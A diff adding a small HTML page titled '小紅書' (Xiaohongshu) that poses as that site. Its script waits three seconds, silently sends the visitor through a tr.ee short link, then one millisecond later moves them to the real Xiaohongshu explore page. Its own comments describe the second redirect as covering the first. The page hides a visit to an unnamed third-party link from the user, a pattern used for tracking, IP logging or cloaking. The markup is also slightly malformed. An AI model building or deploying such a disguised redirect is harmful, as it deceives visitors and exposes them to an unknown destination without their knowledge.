@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+  <meta charset="UTF-8">
+  <title>小紅書</title>
+  <script>
+    // 3 秒後先跳 B 網頁
+    setTimeout(function() {
+      window.location.href = "https://tr.ee/DEaTpO";
+
+      // 再用短延遲跳到 C 網頁（覆蓋 B 網頁）
+      setTimeout(function() {
+        window.location.href = "https://www.xiaohongshu.com/explore";
+      }, 1); // 1 毫秒覆蓋
+    }, 3000); // 3 秒延遲
+  </script>
+</head>
+</body>
+</html>
